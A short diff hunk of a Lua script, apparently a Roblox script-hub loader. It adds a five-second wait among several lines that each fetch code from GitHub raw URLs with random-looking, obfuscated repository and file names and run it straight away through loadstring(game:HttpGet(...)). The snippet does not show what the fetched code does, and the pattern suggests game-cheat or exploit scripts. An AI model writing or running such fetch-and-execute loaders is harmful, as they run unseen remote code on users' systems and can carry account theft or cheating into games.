@@ -5,6 +5,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/aehtnpopoaoer
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoioiesrdmvipso324326523523/main/sfasfdrhadfgsad3253467457sdfgdfshfdhjj", true))()
 
 --Other
+wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/htsrshtroipndsoijdshtjoihdtsff0hoihjsi/main/fjfszfjtsjdtzsj", true))()
 
 --Safe
